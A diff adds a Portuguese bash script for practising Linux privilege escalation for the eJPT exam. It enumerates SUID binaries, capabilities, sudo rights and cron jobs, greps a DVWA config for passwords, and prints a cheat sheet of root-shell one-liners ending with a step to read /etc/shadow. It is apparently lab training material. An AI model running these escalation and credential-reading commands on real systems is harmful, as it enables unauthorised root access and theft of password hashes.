@@ -1,0 +1,77 @@
+#!/bin/bash
+# LIBERTUS - Script de Prática de Privesc Linux
+# Para preparação eJPT
+# Uso: ./privesc_practice.sh
+
+echo "==============================================="
+echo "  LIBERTUS PRIVESC ENUMERATION"
+echo "  Técnicas que caem no eJPT"
+echo "==============================================="
+echo ""
+
+echo "[1] SUID Binaries"
+echo "    Comando: find / -perm -4000 2>/dev/null"
+echo "    O que procurar: find, vim, nmap, python, perl, bash"
+echo ""
+find / -perm -4000 2>/dev/null 2>&1 | grep -E "(find|vim|nmap|python|perl|bash|env|awk)" || echo "    Nenhum SUID exploitável comum encontrado"
+echo ""
+
+echo "[2] Capabilities"
+echo "    Comando: getcap -r / 2>/dev/null"
+echo "    O que procurar: python, perl, node com cap_setuid"
+echo ""
+getcap -r / 2>/dev/null 2>&1 | grep -E "(setuid|dac_override)" || echo "    Nenhuma capability exploitável encontrada"
+echo ""
+
+echo "[3] Sudo sem senha"
+echo "    Comando: sudo -l"
+echo "    O que procurar: NOPASSWD em qualquer comando"
+echo ""
+sudo -l 2>/dev/null || echo "    sudo -l requer senha ou não configurado"
+echo ""
+
+echo "[4] Arquivos de configuração com senhas"
+echo "    Locais comuns:"
+echo "    - /var/www/html/*/wp-config.php (WordPress)"
+echo "    - /var/www/html/*/sites/default/settings.php (Drupal)"
+echo "    - /etc/mysql/debian.cnf"
+echo ""
+cat /var/www/html/config/config.inc.php 2>/dev/null | grep -i password | head -3 || echo "    Config DVWA não acessível ou sem password"
+echo ""
+
+echo "[5] Cronjobs do sistema"
+echo "    Comando: cat /etc/crontab"
+echo "    O que procurar: scripts writeable rodando como root"
+echo ""
+cat /etc/crontab 2>/dev/null | grep -v "^#" | grep -v "^$" | head -10 || echo "    /etc/crontab não acessível"
+echo ""
+
+echo "[6] Versão do Kernel (kernel exploits)"
+echo "    Comando: uname -r"
+echo "    Nota: menos comum no eJPT, mas aparece"
+echo ""
+uname -r 2>/dev/null
+echo ""
+
+echo "==============================================="
+echo "  TÉCNICA SUID FIND (A MAIS COMUM NO eJPT)"
+echo "==============================================="
+echo ""
+echo "Se 'find' tiver SUID, escalar com:"
+echo ""
+echo "  /usr/bin/find . -exec /bin/sh -p \\; -quit"
+echo ""
+echo "O -p mantém privilégios SUID."
+echo ""
+
+echo "==============================================="
+echo "  CHEATSHEET RÁPIDO"
+echo "==============================================="
+echo "SUID find:     find . -exec /bin/sh -p \\; -quit"
+echo "SUID vim:      vim -c ':!/bin/sh'"
+echo "SUID python:   python -c 'import os;os.setuid(0);os.system(\"/bin/sh\")'"
+echo "SUID bash:     bash -p"
+echo "SUID nmap:     nmap --interactive -> !sh"
+echo ""
+echo "Depois de root: cat /etc/shadow, cat /root/flag.txt"
+echo ""
